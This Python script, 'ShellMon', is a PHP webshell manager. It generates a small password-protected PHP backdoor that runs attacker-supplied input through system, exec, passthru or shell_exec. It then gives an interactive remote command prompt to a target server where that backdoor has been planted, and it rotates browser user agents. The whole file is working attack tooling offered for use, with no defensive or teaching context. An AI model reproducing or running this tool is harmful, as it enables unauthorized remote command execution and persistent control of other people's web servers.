#!/usr/bin/python3
import os
import re
import sys
import time
import random
from argparse import ArgumentParser
from urllib.parse import urlparse
from urllib.error import ( HTTPError, URLError )
from urllib.request import ( Request, urlopen, install_opener, build_opener )

yellow = '\033[93m'
green = '\033[92m'
white = '\033[97m'
red = '\033[91m'
end = '\033[0m'

class ShellMon:
	_user_agent = [
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
   "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0",
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
   "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
	]
	__shell_stub = "<?=(isset($_GET[0])&&$_GET[0]==\"%s\"?:die(\"0\"))&&@$_POST[0]($_POST[1]);"

	def __init__(self, url, function, password):
		self._base_url = url
		self._function = function
		self.password = password
		
	def __requester(self, payload=False):
		try:
			opener = build_opener()
			opener.addheaders = [
				("Connection", "close"),
				("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
				("Accept-Encoding", "deflate"),
				("Accept-Language", "en-US,en;q=0.5"),
				("ShellMon", "Developed By Wahyou Randovlsky"),
				("User-Agent", random.choice(self._user_agent)),
			]
			install_opener(opener)
			if payload:
				request = Request(self._base_url +"?"+ payload[0], data=payload[1])
			else:
				request = Request(self._base_url)
			response = urlopen(request, timeout=15)
			return {"code":response.status, "content":response.read()}
		except ( HTTPError, URLError ) as err:
				return {"code":err.code}

	def generate(self, name):
		with open(name, "w") as file:
			file.write(self.__shell_stub % (self.password))
			file.close()
			return True
		return False

	def spawn(self, command):
		payload = ["0={}".format(self.password), bytes("0={}&1={}".format(self._function, command), "utf-8")]
		response = self.__requester(payload)
		return response

	def check(self):
		response = self.__requester()
		if response["code"] == 200:
			return True
		return False

def main():
	Banner = """\n _____ _       _ _               
|   __| |_ ___| | |_____ ___ ___ 
|__   |   | -_| | |     | . |   |
|_____|_|_|___|_|_|_|_|_|___|_|_|
> An Simple PHP Webshell Manager
--------------------------------\n"""
	usage="python %(prog)s [options]"
	parser = ArgumentParser(usage=usage, add_help=False)
	parser.add_argument("-u", dest="url", help="url of the webshell")
	parser.add_argument("-p", dest="password", default="loveyou", help="password of the webshell")
	parser.add_argument("--func", metavar="FUNCTION", choices={"exec", "system", "passthru", "shell_exec"}, default="system", help="php shell function that will be used")
	other = parser.add_argument_group()
	other.add_argument("--generate", action="store_true", help="generate a new shellmon")
	if len(sys.argv) == 1:
		parser.print_help(sys.stderr)
		sys.exit(1)
	args = parser.parse_args()
	print ( Banner )
	shellmon = ShellMon(args.url, args.func, args.password)
	if args.url and args.generate:
		print("Please select one argument between -p and d --generate, because they have different functions")
	elif args.generate:
		print("While generate shellmon...", end="")
		for _ in range(70-len(args.password)):
			print("/-\|" [_ % 4], end="\b")
			sys.stdout.flush()
			time.sleep(0.1)
		filename = str(random.randint(0, 9)) + ".php"
		if shellmon.generate(filename):
			print("\nSuccessfully generate shellmon with password \"%s\"" % (shellmon.password))
			print("File are stored on ./" + filename)
		else:
			print("\nFailed to generate :(")
	elif args.url:
		if shellmon.check() is not True:
			print("Server not returned response code 200 OK")
			sys.exit(1)
		print("Shellmon is spawned now and running on your target!\nDon't stop program using a key CTRL + Z")
		while True:
			command = input("{}shellmon{}@{}{}{}${} ".format(red, yellow, red, urlparse(args.url).hostname, white, green))
			print(end)
			if command == "!" or command == "die" or command == "exit":
				print("Shell terminated 💔")
				break
			if command == "?" or command == "help":
				print("""\
Command        Description
-------        -----------
!, die, exit   terminated shell""")
				continue
			elif command == "clear":
				os.system("clear")
				continue
			term = shellmon.spawn(command)
			if term["code"] != 200:
				print("Shell terminated 💔")
				print("Server returned response code", term["code"])
				break
			result = term["content"].decode("utf-8")
			if result == "0":
				print("{}WRONG PASSWORD!{}".format(red, end))
				break
			print(result)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("{}Program stopped by user -,-\nThank you for using this tool".format(end))